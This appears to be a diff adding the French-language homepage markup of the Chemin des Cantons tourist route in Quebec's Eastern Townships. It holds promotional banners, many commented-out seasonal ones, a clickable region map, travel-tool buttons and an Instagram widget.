@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Chemin des Cantons - Découvrir les Cantons-de-l&apos;Est</title>
+  <meta name="description"
+        content="Le Chemin des Cantons, les Cantons-de-l’Est autrement! Une route touristique pour découvrir nos plus beaux paysages, notre patrimoine américain et britannique exceptionnel et l’hospitalité légendaire des gens de chez nous! Cette activité touristique met en valeur le patrimoine bâti et naturel des Cantons-de-l’Est à travers une route touristique encadrée et signalisée qui sillonne les différentes régions des Cantons-de-l&apos;Est.">
+  <?php include("includes/html-head.php"); ?>
+
+  <meta property="og:title" content="Chemin des Cantons - Découvrir les Cantons-de-l&apos;Est">
+  <meta property="og:description"
+        content="Le Chemin des Cantons, les Cantons-de-l’Est autrement! Une route touristique pour découvrir nos plus beaux paysages, notre patrimoine américain et britannique exceptionnel et l’hospitalité légendaire des gens de chez nous! Cette activité touristique met en valeur le patrimoine bâti et naturel des Cantons-de-l’Est à travers une route touristique encadrée et signalisée qui sillonne les différentes régions des Cantons-de-l&apos;Est.">
+  <meta property="og:image" content>
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://dev.chemindescantons.qc.ca/index.php">
+</head>
+
+<body data-section-id="accueil">
+
+  <!-- Header -->
+  <header class="navbar-wrapper">
+    <?php include("fr/includes/header_et_nav.php"); ?>
+  </header>
+  <!-- //Header -->
+
+  <!-- Photo top -->
+  <div class="entete-photo-container">
+    <div class="entete-photo entete-photo__accueil">
+      <div class="entete-photo__img" id="entete-photo__img">
+        <img id="entete-photo__img-scr" class="editable"
+             src="upload_images/accueil/Coaticook_pont_couvert_grange_ronde_slemire.JPG" alt width="2500" height="1800">
+      </div>
+      <div class="entete-photo__contenu wp-block-cover__inner-container">
+        <div class="container">
+          <div class="row justify-content-center text-center">
+            <div class="col-auto editable" id="entete-photo__contenu">
+              <p><span style="font-size: xx-large; color: #ffffff;"><strong>Les Cantons-de-l’Est
+                    autrement!</strong></span></p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- //Photo top -->
+
+  <!-- Slogan accueil -->
+  <div class="slogan-accueil">
+    <div class="slogan-accueil-contenu">
+      <div class="cercle">
+        <h2 class>PRENEZ LA ROUTE</h2>
+        <p><span class="banderole">SUR LE CHEMIN DES CANTONS</span></p>
+        <p><em>8 régions à découvrir</em></p>
+      </div>
+    </div>
+  </div>
+  <!-- //Slogan accueil -->
+
+  <!-- Contenu container -->
+  <main role="main">
+    <article>
+
+      <!-- Section de contenu -->
+      <section class="marge-bas-80 padding-haut-30 editable" id="bannieres-container">
+        <div class="bannieres-container container px-25px p-lg-0">
+          <div class="row mt-50px mb-100px cms-repeatable">
+            <div class="col-lg-10 col-xl-8 contenu">
+              <p>Le Chemin des Cantons, les Cantons-de-l’Est autrement! Une route touristique pour découvrir nos plus
+                beaux paysages, notre patrimoine américain et britannique exceptionnel et l’hospitalité légendaire des
+                gens de chez nous! Cette activité touristique met en valeur le patrimoine bâti et naturel des
+                Cantons-de-l’Est à travers une route touristique encadrée et signalisée qui sillonne les différentes
+                régions des Cantons-de-l&apos;Est. Vous découvrirez de charmants coeurs villageois, des ponts couverts,
+                des granges rondes, des centres d&apos;interprétation uniques et bien plus encore. Venez prendre le
+                temps le long du Chemin des Cantons! Des attractions touristiques uniques vous attendent. Bonne route et
+                merveilleuse découvertes!</p>
+            </div>
+          </div>
+          <!-- Debut Banniere belles demeures d'époque -->
+          <div class="row mb-40px texte-blanc text-center cms-repeatable">
+            <div class="col-lg-10 col-sm-8 encadre-ombrage p-5px">
+              <div class="row g-0 justify-content-center align-items-center fond-rouge">
+                <div class="col-lg-6 px-20px py-40px">
+                  <p class="texte-gros">Savourez le patrimoine d&apos;ici</p>
+                  <p class="texte-tres-tres-gros">AVEC L’ADORÉE DES CANTONS</p>
+                </div>
+                <div class="col-lg-6 p-0">
+                  <div class="card"><img class="card-img-top"
+                         src="upload/page-daccueil/Image%203%20banni%C3%A8re%20page%20d%27accueil%20CDC_bi%C3%A8re.png">
+                    <div class="card-img-overlay d-flex w-100 justify-content-center align-items-center"><a
+                         class="btn btn-blanc texte-tres-gros texte-rouge"
+                         href="https://www.hopchemindescantons.com/biere">En savoir plus</a></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <!-- Fin Banniere belles demeures d'époque -->
+          <!-- Debut Banniere Histoires en canne -->
+          <!-- Fin Banniere Histoires en canne -->
+          <!-- Debut Banniere Pont couvert -->
+          <div class="row mb-40px texte-blanc text-center cms-repeatable">
+            <div class="col-lg-10 col-sm-8 encadre-ombrage p-5px">
+              <div class="row g-0 justify-content-center align-items-center fond-rouge">
+                <div class="col-lg-6 px-20px py-40px">
+                  <p class="texte-gros">Explorez à votre rythme</p>
+                  <p class="texte-tres-tres-gros">NOS CHEMINS THÉMATIQUES</p>
+                </div>
+                <div class="col-lg-6 p-0">
+                  <div class="card"><img class="card-img-top"
+                         src="upload/page-daccueil/Image%203%20banni%C3%A8re%20page%20d%27accueil%20CDC_HOP.png">
+                    <div class="card-img-overlay d-flex w-100 justify-content-center align-items-center"><a
+                         class="btn btn-blanc texte-tres-gros texte-rouge"
+                         href="https://www.hopchemindescantons.com/">Voir les chemins</a></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="row mb-40px texte-blanc text-center cms-repeatable">
+            <div class="col-lg-10 col-sm-8 encadre-ombrage p-5px">
+              <div class="row g-0 justify-content-center align-items-center fond-rouge">
+                <div class="col-lg-6 px-20px py-40px">
+                  <p class="texte-gros">Connaissez-vous vraiment l’histoire des Cantons-de-l’Est? </p>
+                  <p class="texte-tres-tres-gros">10 CAPSULES AUDIOS</p>
+                </div>
+                <div class="col-lg-6 p-0">
+                  <div class="card"><img class="card-img-top" src="images/banniere-histoires-en-canne.jpg" alt>
+                    <div class="card-img-overlay d-flex w-100 justify-content-center align-items-center"><a
+                         class="btn btn-blanc texte-tres-gros texte-rouge" href="fr/activites/histoires-en-canne.php">En
+                        savoir plus</a></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <!-- Fin Banniere Pont couvert -->
+          <!-- Debut Banniere marchés de noel
+                    <div class="row marge-bas-40">
+                            <div class="hidden-xs hidden-sm col-md-1"></div>
+                            <div class="col-lg-10 encadre-ombrage padding-haut-5 padding-bas-5 padding-droite-5 padding-gauche-5">
+                                <div class="col-flex fond-rouge">
+                         <div class="col-flex__item texte-blanc texte-tres-gros aligne-centre padding-20 padding-haut-40 padding-bas-40 editable" id="untitled-region-2" style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;"><p>Découvrez les</p>
+                        <div class="texte-tres-tres-gros">Marchés&nbsp;de Noël</div>
+                        <p>sur le Chemin des Cantons</p></div>
+                      <div class="banniere-3 col-flex__item aligne-centre padding-20 padding-haut-lg-90 padding-haut-md-70 padding-bas-60 editable" id="banniere-3" style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;"><p><a class="btn btn-primary texte-tres-gros bordure bordure-blanche" href="fr/routes/route-des-marches-de-noel.php"><span class="texte-blanc">Marchés de Noël</span></a></p></div>
+                                </div>
+                            </div>
+                        </div>
+                        Fin bannière marches de noel -->
+          <!-- Debut Banniere route d'automne
+                     <div class="row marge-bas-40">
+                            <div class="hidden-xs hidden-sm col-md-1"></div>
+                            <div class="col-lg-10 encadre-ombrage padding-haut-5 padding-bas-5 padding-droite-5 padding-gauche-5">
+                                <div class="col-flex fond-rouge">
+                                    <div class="col-flex__item texte-blanc texte-tres-gros aligne-centre padding-20 padding-haut-40 padding-bas-40 editable" id="untitled-region-2" style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;"><p>Découvrez la splendeur de</p>
+                                    <div class="texte-tres-tres-gros">L'AUTOMNE</div>
+                                    <p>sur le Chemin des Cantons</p></div>
+                                    <div class="banniere-1 col-flex__item aligne-centre padding-20 padding-haut-lg-70 padding-haut-md-70 padding-bas-60 editable" id="banniere-automne-img" style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;"><p><a class="btn btn-blanc texte-tres-gros" href="fr/activites/automne.php"><span class="texte-rouge">En savoir plus </span></a></p></div>
+                                </div>
+                            </div>
+                        </div>
+                        Fin bannière route d'automne -->
+          <!-- Debut Banniere festival thé Cantons -->
+          <!-- <div class="row marge-bas-40">
+                        <div class="hidden-xs hidden-sm col-md-1"></div>
+                        <div class="col-lg-10 encadre-ombrage padding-haut-5 padding-bas-5 padding-droite-5 padding-gauche-5">
+                        <div class="col-flex fond-rouge">
+                        <div class="col-flex__item texte-blanc texte-tres-gros aligne-centre padding-20 padding-haut-40 padding-bas-40 editable" id="banniere-the-texte" style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;"><p>Découvrez le thé à l'anglaise <br> lors du</p>
+                        <div class="texte-tres-tres-gros">Festival du thé des Cantons</div></div>
+                                                
+                        <div class="banniere-3 col-flex__item aligne-centre padding-20 padding-haut-lg-70 padding-haut-md-70 padding-bas-70 editable" id="banniere-the-img" style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;display:flex;justify-content:center;"><p><a class="btn btn-blanc texte-tres-gros" title="Thés Cantons-de-l'Est" href="fr/activites/festival-the-cantons.php"><span class="texte-rouge">En savoir plus </span></a></p></div>
+                        </div>
+                    </div>
+                      </div>
+                    <!-- Fin Banniere festival thé Cantons -->
+          <!-- Debut Dimanche dans les Cantons
+                    <div class="row marge-bas-40">
+                        <div class="hidden-xs hidden-sm col-md-1"></div>
+                        <div class="col-lg-10 encadre-ombrage padding-haut-5 padding-bas-5 padding-droite-5 padding-gauche-5">
+                            <div class="col-flex fond-rouge">
+                                <div class="col-flex__item texte-blanc texte-tres-gros aligne-centre padding-20 padding-haut-40 padding-bas-40 editable" id="banniere-blogue-texte"
+                                    style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;"><p>Les sites spirituels et religieux des Cantons-de-l’Est</p>
+                                <div class="texte-tres-tres-gros">Dimanche dans les Cantons</div></div>
+                                <div class="banniere-1 col-flex__item aligne-centre padding-20 padding-haut-lg-70 padding-haut-md-70 padding-bas-60 editable" id="banniere-blogue-img"
+                                    style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;"><p><a class="btn btn-blanc texte-tres-gros" title="Circuit églises, cimetières et presbytères Cantons-de-l’Est" href="fr/routes/route-patrimoine-religieux.php"><span class="texte-rouge">Voir</span></a></p></div>
+                            </div>
+                        </div>
+                    </div>
+                     Fin Dimanche dans les Cantons -->
+          <!-- Debut Banniere Route des thés 
+                    <div class="row marge-bas-40">
+                        <div class="hidden-xs hidden-sm col-md-1"></div>
+                            <div class="col-lg-10 encadre-ombrage padding-haut-5 padding-bas-5 padding-droite-5 padding-gauche-5">
+                                <div class="col-flex fond-rouge">
+                                    <div class="col-flex__item texte-blanc texte-tres-gros aligne-centre padding-20 padding-haut-40 padding-bas-40 editable" id="banniere-the-texte" style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;">
+                                        <p>La tradition du service du <br>thé à l'anglaise</p>
+                                        <div class="texte-tres-tres-gros">Route des thés à l'anglaise</div></div>
+                                    <div class="banniere-3 col-flex__item aligne-centre padding-20 padding-haut-lg-70 padding-haut-md-70 padding-bas-70 editable" id="banniere-the-img" style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;display:flex;justify-content:center;"><p><a class="btn btn-blanc texte-tres-gros" title="Thés Cantons-de-l'Est" href="/fr/routes/route-des-thes.php"><span class="texte-rouge">En savoir plus </span></a></p></div>
+                                </div>
+                            </div>
+                      </div>
+                    Fin Banniere Route des thés -->
+          <!-- Debut BLOGUE -->
+          <!-- <div class="row marge-bas-40">
+                        <div class="hidden-xs hidden-sm col-md-1"></div>
+                        <div class="col-lg-10 encadre-ombrage padding-haut-5 padding-bas-5 padding-droite-5 padding-gauche-5">
+                            <div class="col-flex fond-rouge">
+                                <div class="col-flex__item texte-blanc texte-tres-gros aligne-centre padding-20 padding-haut-40 padding-bas-40 editable" id="banniere-blogue-texte"
+                                    style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;">
+                                    <p>Notre blogue propose <br> des suggestions de</p>
+                                    <div class="texte-tres-tres-gros">Sorties</div>
+                                </div>
+                                <div class="banniere-1 col-flex__item aligne-centre padding-20 padding-haut-lg-70 padding-haut-md-70 padding-bas-60 editable" id="banniere-blogue-img"
+                                    style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;">
+                                    <p><a class="btn btn-blanc texte-tres-gros" title="Blogue Cantons-de-l'Est" href="blogue/"><span class="texte-rouge">Voir le blogue </span></a></p>
+                                </div>
+                            </div>
+                        </div>
+                    </div> -->
+          <!-- Fin BLOGUE -->
+          <!-- Debut SONDAGE -->
+          <!-- <div class="row marge-bas-40">
+                            <div class="hidden-xs hidden-sm col-md-1"></div>
+                            <div class="col-lg-10 encadre-ombrage padding-haut-5 padding-bas-5 padding-droite-5 padding-gauche-5">
+                                <div class="col-flex fond-rouge">
+                                    <div class="col-flex__item texte-blanc texte-tres-gros aligne-centre padding-20 padding-haut-40 padding-bas-40 editable" id="banniere-blogue-texte" style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;"><div>Répondez à notre</div>
+                                    <div class="texte-tres-tres-gros">Sondage</div>
+                                    <p>et participez au tirage d'une fin de semaine sur le Chemin des Cantons!</p></div>
+                                    <div class="banniere-1 col-flex__item aligne-centre padding-20 padding-haut-lg-70 padding-haut-md-70 padding-bas-60 editable" id="banniere-blogue-img" style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;"><p><a class="btn btn-blanc texte-tres-gros" title="Sondage Chemin des Cantons" href="https://tinyurl.com/sondage-chemin-cantons" target="_blank" rel="noopener noreferrer"><span class="texte-rouge">Participer </span></a></p></div>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- Fin SONDAGE -->
+          <!-- Debut Banniere Reguines et fantomes-->
+          <!--   <div class="row marge-bas-40">
+                            <div class="hidden-xs hidden-sm col-md-1"></div>
+                            <div class="col-lg-10 encadre-ombrage padding-haut-5 padding-bas-5 padding-droite-5 padding-gauche-5">
+                                <div class="col-flex fond-rouge">
+                                    <div class="col-flex__item texte-blanc texte-tres-gros aligne-centre padding-20 padding-haut-40 padding-bas-40 editable" id="untitled-region-2" style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;">
+                                       C’est le retour de <br>l’animation théâtrale
+                                          <div class="texte-tres-tres-gros">Réguines et fantômes</div>
+                                   
+                                    </div>
+                                    <div class="banniere-5 col-flex__item aligne-centre padding-20 padding-haut-lg-90 padding-haut-md-70 padding-bas-60 editable" id="https://www.chemindescantons.qc.ca/fr/reguines-et-fantomes/images/photo-reguines-et-fantomes-sm.jpg" style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;" id="untitled-region-3">
+                                        <a href="fr/reguines-et-fantomes/index.php" title="Programmation Activités Cantons-de-l'Est" class="btn btn-blanc texte-tres-gros"><span class="texte-rouge">Programmation<span class="glyphicon glyphicon-triangle-right" aria-hidden="true"></span></span></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>-->
+          <!--Fin bannière reguines et fantomes -->
+          <!-- Debut Banniere thé à l'anglaise -->
+          <!-- <div class="row marge-bas-40">
+                        <div class="hidden-xs hidden-sm col-md-1"></div>
+                            <div class="col-lg-10 encadre-ombrage padding-haut-5 padding-bas-5 padding-droite-5 padding-gauche-5">
+                                <div class="col-flex fond-rouge">
+                                    <div class="col-flex__item texte-blanc texte-tres-gros aligne-centre padding-20 padding-haut-40 padding-bas-40 editable" id="banniere-the-texte" style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;"><p>Une immersion dans l’univers du thé à l'anglaise avec le</p>
+                                        <div class="texte-tres-tres-gros">Festival du thé des Cantons</div></div>
+                                    <div class="banniere-3 col-flex__item aligne-centre padding-20 padding-haut-lg-70 padding-haut-md-70 padding-bas-70 editable" id="banniere-the-img" style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;display:flex;justify-content:center;"><p><a class="btn btn-blanc texte-tres-gros" title="Thés Cantons-de-l'Est" href="fr/activites/festival-the-cantons.php"><span class="texte-rouge">En savoir plus </span></a></p></div>
+                                </div>
+                            </div>
+                      </div> -->
+          <!-- Fin Banniere thé à l'anglaise -->
+          <!-- Debut Banniere brico des cantons-->
+          <!-- <div class="row marge-bas-40">
+                            <div class="hidden-xs hidden-sm col-md-1"></div>
+                            <div class="col-lg-10 encadre-ombrage padding-haut-5 padding-bas-5 padding-droite-5 padding-gauche-5">
+                                <div class="col-flex fond-rouge">
+                                    <div class="col-flex__item texte-blanc texte-tres-gros aligne-centre padding-20 padding-haut-40 padding-bas-40 editable" id="untitled-region-2" style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;">
+                                        Activités et bricolages de
+                                          <div class="texte-tres-tres-gros">NOËL</div>
+                                       avec vos musées
+                                    </div>
+                                    <div class="banniere-4 col-flex__item aligne-centre padding-20 padding-haut-lg-90 padding-haut-md-70 padding-bas-60 editable" id="banniere-automne-img" style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;">
+                                        <a href="/fr/activites/index.php" class="btn btn-primary texte-tres-gros bordure bordure-blanche"><span class="texte-blanc">ACTIVITÉS DE NOËL<span class="glyphicon glyphicon-triangle-right" aria-hidden="true"></span></span></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>-->
+          <!--Fin bannière brico des cantons -->
+          <!-- Debut Carnet de Jeux Chemin faisant -->
+          <!-- <div class="row marge-bas-40">
+                        <div class="hidden-xs hidden-sm col-md-1"></div>
+                        <div class="col-lg-10 encadre-ombrage padding-haut-5 padding-bas-5 padding-droite-5 padding-gauche-5">
+                            <div class="col-flex fond-rouge">
+                                <div class="col-flex__item texte-blanc texte-tres-gros aligne-centre padding-20 padding-haut-40 padding-bas-40 editable" id="banniere-carnet-texte"
+                                    style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;"><p>Téléchargez notre <br> carnet de jeux</p>
+                                    <div class="texte-tres-tres-gros">Chemin faisant</div></div>
+                                <div class="banniere-4 col-flex__item aligne-centre padding-20 padding-haut-lg-70 padding-haut-md-70 padding-bas-60 editable" id="banniere-carnet-img"
+                                    style="width:50%;align-items:center;-ms-flex-align:center;-webkit-box-align:center;"><p><a class="btn btn-blanc texte-tres-gros" title="Carnet de Jeu Cantons-de-l'Est" href="fr/carnet-de-jeux-chemin-faisant"><span class="texte-rouge">Plus de détails </span></a></p></div>
+                            </div>
+                        </div>
+                    </div> -->
+          <!-- Fin Carnet de Jeux Chemin faisant -->
+          <!-- Debut Banniere portes ouvertes-->
+          <!-- <div class="col-lg-10 encadre-ombrage padding-haut-5 padding-bas-5 padding-droite-20 padding-gauche-20">
+                            <div class="row fond-rouge">
+                                <div class="col-md-6 texte-blanc texte-tres-gros aligne-centre padding-20 editable" id="untitled-region-2">
+                                    Les 2 et 3 juillet
+                                    <div class="texte-tres-tres-gros">PORTES OUVERTES</div>
+                                    sur les routes touristiques <span class="hidden-xs hidden-sm"><br></span>des Cantons-de-l’Est
+                                </div>
+                                <div class="col-md-6 aligne-centre padding-20 padding-haut-lg-70 padding-haut-md-70 padding-bas-70 portes-ouvertes-photo editable" id="untitled-region-3">
+                                    <a href="fr/a-propos/evenement.php" class="btn btn-blanc texte-tres-gros"><span class="texte-rouge">Voir la programmation <span class="glyphicon glyphicon-triangle-right" aria-hidden="true"></span></span></a>
+                                </div>
+                            </div>
+                        </div>-->
+          <!-- Fin bannière portes ouvertes -->
+          <!-- Debut Banniere Festival du thé des Cantons-->
+          <!--<div class="col-lg-10 encadre-ombrage padding-haut-5 padding-bas-5 padding-droite-20 padding-gauche-20">
+                            <div class="row fond-rouge">
+                                <div class="col-md-6 texte-blanc texte-tres-gros aligne-centre padding-20 editable" id="untitled-region-2">
+                                Les 29 et 30 juin 2019
+                                    <div class="texte-tres-tres-gros">FESTIVAL DU THÉ DES CANTONS</div>
+                                   </div>
+                                <div class="banniere-2 col-md-6 aligne-centre padding-20 padding-haut-lg-70 padding-haut-md-70 padding-bas-70 editable" id="untitled-region-3">
+                                    <a href="fr/documentation/activtites-evenement-festival-the-cantons.php" class="btn btn-blanc texte-tres-gros"><span class="texte-rouge">En savoir plus <span class="glyphicon glyphicon-triangle-right" aria-hidden="true"></span></span></a>
+                                </div>
+                            </div>
+                        </div>-->
+          <!-- Fin Banniere Festival du thé des Cantons  -->
+        </div>
+      </section>
+      <!-- //Section de contenu -->
+
+      <!-- Map -->
+      <div class="container aligne-centre marge-bas-0">
+        <h2 class="texte-rouge aligne-centre marge-haut-0 marge-bas-20">CHOISISSEZ VOTRE RÉGION À DÉCOUVRIR</h2>
+        <p>Une carte des Cantons-de-l&apos;Est vous proposant des centaines d&apos;attractions touristiques et
+          d&apos;événements pour tous les goûts</p>
+      </div>
+      <section class="marge-bas-100 carte-cliquable-chemin-cantons">
+        <div class="container aligne-centre">
+          <img src="images/carte.png" alt="Carte des régions du Chemin des Cantons" width="760" height="494"
+               usemap="#imagemap" title="Carte des régions du Chemin des Cantons">
+          <map name="imagemap">
+            <area shape="poly"
+                  coords="466,294,476,298,487,314,543,315,545,344,620,351,636,364,596,469,402,472,401,464,382,464,380,392,447,392,445,316,466,294"
+                  href="/fr/routes/region-coaticook.php">
+            <area shape="poly"
+                  coords="618,56,564,111,556,103,523,134,527,140,522,149,553,177,522,215,507,205,480,236,480,260,490,261,485,314,543,315,544,344,619,350,675,320,694,344,728,346,727,233,700,136,618,55"
+                  href="/fr/routes/region-haut-st-francois.php" alt="Haut-Saint-François">
+            <area shape="poly"
+                  coords="497,6,466,51,442,53,404,24,369,73,410,104,426,97,454,121,446,132,476,157,497,132,521,149,527,139,522,134,555,101,564,109,618,55,609,44,588,54,554,37,549,44,498,5"
+                  href="/fr/routes/region-des-sources.php" alt="Des Sources">
+            <area shape="poly"
+                  coords="369,74,409,104,425,99,452,120,444,131,475,157,498,132,549,176,521,212,506,202,479,234,464,234,457,227,461,212,445,199,420,200,403,226,418,238,392,241,390,262,366,272,364,246,352,246,351,237,331,236,325,274,253,274,253,236,272,238,272,194,293,158,309,160,333,132,306,108,332,79,346,102,370,74"
+                  href="/fr/routes/region-val-st-francois.php" alt="Val-Saint-François">
+            <area shape="poly"
+                  coords="379,314,434,312,441,284,460,285,466,292,484,309,488,260,481,259,479,236,464,234,456,227,460,210,442,198,422,198,404,225,417,237,393,240,390,263,378,269,378,314"
+                  href="/fr/routes/region-sherbrooke.php" alt="Sherbrooke">
+            <area shape="poly"
+                  coords="244,394,271,394,273,310,252,310,254,276,326,275,332,238,350,238,350,246,364,247,366,271,378,270,378,313,434,312,442,284,458,285,464,292,446,316,446,391,380,391,380,461,400,463,401,472,244,470,244,394"
+                  href="/fr/routes/region-memphremagog.php" alt="Memphrémagog">
+            <area shape="poly"
+                  coords="130,190,192,188,209,194,208,210,254,214,249,312,204,311,178,294,143,292,134,315,110,314,109,321,98,322,129,190"
+                  href="/fr/routes/region-haute-yamaska.php" alt="Haute-Yamaska">
+            <area shape="poly"
+                  coords="62,292,96,322,109,321,111,315,134,314,143,292,175,294,204,311,272,310,269,392,244,392,241,470,2,464,38,300,62,292"
+                  href="/fr/routes/region-brome-missisquoi.php" alt="Brome-Missisquoi">
+          </map>
+        </div>
+      </section>
+      <!-- //Map -->
+
+      <!-- Boutons vedette outils de voyage-->
+      <section class="marge-bas-100">
+        <div class="container">
+          <div class="row">
+            <div class="col-sm-6 col-md-4 marge-bas-grand">
+              <a href="/fr/documentation/index.php" class="bouton-vedette">
+                <img src="images/outils-de-voyage.jpg" alt="OUTILS DE VOYAGE CARTE CIRCUIT CANTONS-DE-L&apos;EST"
+                     width="640" height="410" class="img-responsive rollover-zoom"
+                     title="OUTILS DE VOYAGE CARTE CIRCUIT CANTONS-DE-L&apos;EST">
+              </a>
+            </div>
+            <!-- Fin Boutons vedette -->
+
+            <!-- Boutons vedette ou dormir -->
+            <div class="col-sm-6 col-md-4 marge-bas-grand">
+              <a href="/fr/documentation/ou-dormir.php" class="bouton-vedette">
+                <img src="images/ou-dormir.jpg" alt="Où dormir hébergement dans les Cantons-de-l&apos;Est" width="640"
+                     height="410" class="img-responsive rollover-zoom"
+                     title="Où dormir hébergement dans les Cantons-de-l&apos;Est">
+              </a>
+            </div>
+            <!-- Fin Boutons vedette ou dormir -->
+
+            <!-- Boutons vedette ou manger -->
+            <div class="col-sm-6 col-md-4 marge-bas-grand">
+              <a href="/fr/documentation/ou-manger.php" class="bouton-vedette">
+                <img src="images/ou-manger.jpg" alt="Où manger restaurants Cantons-de-l&apos;Est" width="640"
+                     height="410" class="img-responsive rollover-zoom"
+                     title="Où manger restaurants Cantons-de-l&apos;Est">
+              </a>
+            </div>
+            <!-- Fin Boutons vedette ou manger -->
+            <!-- Début Boutons Route des belles demeures d'époque-->
+            <div class="col-sm-6 col-md-4 marge-bas-grand">
+              <a href="fr/routes/route-belles-demeures-epoque.php" class="bouton-vedette">
+                <img src="images/route-demeures.jpg" alt="Demeures d&apos;époque patrimoine bâti Cantons-de-l&apos;Est"
+                     width="640" height="465" class="img-responsive rollover-zoom"
+                     title="Demeures d&apos;époque patrimoine bâti Cantons-de-l&apos;Est">
+              </a>
+            </div>
+            <!-- Fin Boutons Route des belles demeures d'époque-->
+
+            <!-- Début Boutons Route des circuits patrimoniaux -->
+            <div class="col-sm-6 col-md-4 marge-bas-grand">
+              <a href="/fr/routes/route-des-circuits-patrimoniaux.php" class="bouton-vedette">
+                <img src="images/btn-vedette-circuits-patrimoniaux.jpg" alt="Route des circuits patrimoniaux"
+                     width="640" height="410" class="img-responsive rollover-zoom"
+                     title="Route des circuits patrimoniaux ">
+              </a>
+            </div>
+            <!-- Fin Boutons Route des circuits patrimoniaux -->
+
+            <!-- Début Boutons Ponts couverts et granges rondes -->
+            <div class="col-sm-6 col-md-4 marge-bas-grand">
+              <a href="/fr/routes/route-ponts-couverts-granges-rondes.php" class="bouton-vedette">
+                <img src="images/btn-vedette-ponts-couverts.jpg" width="640" height="410"
+                     class="img-responsive rollover-zoom" alt="Route des ponts couverts et granges rondes">
+              </a>
+            </div>
+            <!-- Fin Boutons Ponts couverts et granges rondes -->
+
+            <!-- Début Boutons Route des thes-->
+            <!-- <div class="col-sm-6 col-md-4 marge-bas-grand">
+                            <a href="https://www.chemindescantons.qc.ca/fr/routes/route-des-thes.php" class="bouton-vedette">
+                                <img src="images/route-des-thes.jpg" alt="Route des thés des Cantons de l'Est" width="640" height="410" class="img-responsive rollover-zoom" title="Route des thés des Cantons de l'Est">
+                            </a>
+                        </div> -->
+            <!-- Fin Boutons Route des thes-->
+
+            <!-- Début Boutons Route d'automne-->
+            <!--      <div class="col-sm-6 col-md-4 marge-bas-grand">
+                           <a href="fr/routes/route-automne.php" class="bouton-vedette">
+                                <img src="images/route-dautomne.jpg" alt="Route d'automne attractions touristiques" width="640" height="410" class="img-responsive rollover-zoom" title="Route d'automne attractions touristiques">
+                         </a>
+                        </div>
+                        <!-- Fin Boutons Route d'automne-->
+
+            <!-- Début Boutons Marché de Noel-->
+            <!-- <div class="col-sm-6 col-md-4 marge-bas-grand">
+                            <a href="/fr/routes/route-des-marches-de-noel.php" class="bouton-vedette">
+                                <img src="images/marches-noel.jpg" alt="Route des Marchés de Noël sur le chemin des Cantons des Cantons-de-l'Est" width="640" height="410" class="img-responsive rollover-zoom"
+                                    title="Route des Marchés de Noël sur le chemin des Cantons des Cantons-de-l'Est">
+                            </a>
+                        </div> -->
+            <!-- Fin Boutons Marché de Noel-->
+
+            <!-- Boutons vedette Vidéo -->
+            <!--     <div class="col-sm-6 col-md-4 marge-bas-grand">
+                            <a href="/fr/a-propos/#videos" class="bouton-vedette">
+                                <img src="images/video-promo.jpg" width="640" height="410" class="img-responsive rollover-zoom" alt="VIDÉO PROMO">
+                            </a>
+                        </div>-->
+            <!-- Fin Boutons vedette Vidéo -->
+
+          </div>
+        </div>
+      </section>
+      <!-- //Boutons vedette -->
+
+      <!-- Bande rouge calendrier -->
+      <section class="marge-bas-100 big-button">
+        <a href=" https://www.cantonsdelest.com/evenements" title="Activités Cantons-de-l&apos;Est" target="_blank">
+          <div class="container">
+            <div class="row">
+              <div class="col-xs-12 col-sm-8 position-relative">
+                <h2>CALENDRIER DES ACTIVITÉS</h2>
+                <p class="marge-bas-0">La région propose une panoplie d’activités culturelles et historiques, consultez
+                  la programmation de Tourisme Cantons-de-l’Est pour tout savoir!</p>
+                <div class="point-interogation"><span><span>?</span></span></div>
+              </div>
+            </div>
+          </div>
+        </a>
+      </section>
+      <!-- //Bande rouge calendrier -->
+
+      <!-- Liens -->
+      <section class="marge-bas-100 padding-haut-20">
+        <div class="container">
+          <div class="row">
+
+            <div class="col-lg-6 padding-bas-grand aligne-centre ">
+              <div class="marge-bas-grand">
+                <div style="text-align: center;">
+                  <a href="https://www.instagram.com/chemindescantons/?hl=fr" target="_blank"
+                     class="lien-invisible texte-tres-gros"><img src="/images/assets/icon-instagram.svg"
+                         alt="Instagram Cantons-de-l&apos;Est" width="40" height="40"
+                         title="Instagram Cantons-de-l&apos;Est">  <strong>@chemindescantons</strong></a>
+                </div>
+                <style type="text/css">
+                  @media (max-width: 520px) {
+                    #instagram-widget {
+                      height: 950px !important;
+                    }
+                  }
+
+                </style>
+                <div style="max-width:475px;margin:0 auto;">
+                  <iframe id="instagram-widget" src="https://widget.taggbox.com/60065"
+                          style="width:100%;height:600px;border:none;"></iframe>
+                </div>
